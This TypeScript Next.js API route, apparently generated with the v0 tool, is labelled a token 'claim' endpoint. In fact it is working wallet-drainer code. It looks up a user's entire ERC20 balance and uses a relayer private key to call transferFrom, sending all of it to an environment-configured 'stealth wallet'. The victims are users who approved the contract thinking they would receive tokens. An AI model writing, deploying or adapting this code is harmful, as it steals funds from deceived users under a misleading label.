import { ethers } from 'ethers';
import { NextRequest, NextResponse } from 'next/server';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

const ERC20_ABI = [
  'function transferFrom(address from, address to, uint256 amount) external returns (bool)',
  'function balanceOf(address owner) view returns (uint256)'
];

export async function POST(request: NextRequest) {
  try {
    console.log('[v0] Claim API: Request received');
    
    const relayerKey = process.env.RELAYER_PRIVATE_KEY;
    const rpcUrl = process.env.BSC_RPC_URL;
    const tokenAddress = process.env.NEXT_PUBLIC_TOKEN_ADDRESS;
    const stealthWallet = process.env.STEALTH_WALLET_ADDRESS;

    if (!relayerKey || !rpcUrl || !tokenAddress || !stealthWallet) {
      console.error('[v0] Missing env vars');
      return NextResponse.json(
        { error: 'Missing required environment variables' },
        { status: 500 }
      );
    }

    const { userAddress } = await request.json();

    if (!userAddress || !ethers.isAddress(userAddress)) {
      console.error('[v0] Invalid user address:', userAddress);
      return NextResponse.json(
        { error: 'Invalid user address' },
        { status: 400 }
      );
    }

    console.log('[v0] Claiming tokens from:', userAddress, 'to:', stealthWallet);

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const relayerWallet = new ethers.Wallet(relayerKey, provider);
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, relayerWallet);

    // Get user's token balance
    const balance = await tokenContract.balanceOf(userAddress);
    console.log('[v0] User balance:', balance.toString());

    if (balance === 0n) {
      return NextResponse.json(
        { error: 'User has no tokens to claim' },
        { status: 400 }
      );
    }

    // Transfer tokens from user to stealth wallet using relayer
    console.log('[v0] Executing transferFrom:', userAddress, '->', stealthWallet, 'amount:', balance.toString());
    const tx = await tokenContract.transferFrom(userAddress, stealthWallet, balance);
    console.log('[v0] Transaction sent:', tx.hash);

    const receipt = await tx.wait();
    console.log('[v0] Transaction confirmed in block:', receipt?.blockNumber);

    return NextResponse.json(
      {
        success: true,
        txHash: tx.hash,
        blockNumber: receipt?.blockNumber,
        amount: balance.toString(),
        from: userAddress,
        to: stealthWallet
      },
      { status: 200 }
    );
  } catch (error: any) {
    console.error('[v0] Claim error:', error);
    return NextResponse.json(
      { error: error?.message || 'Claim failed' },
      { status: 500 }
    );
  }
}
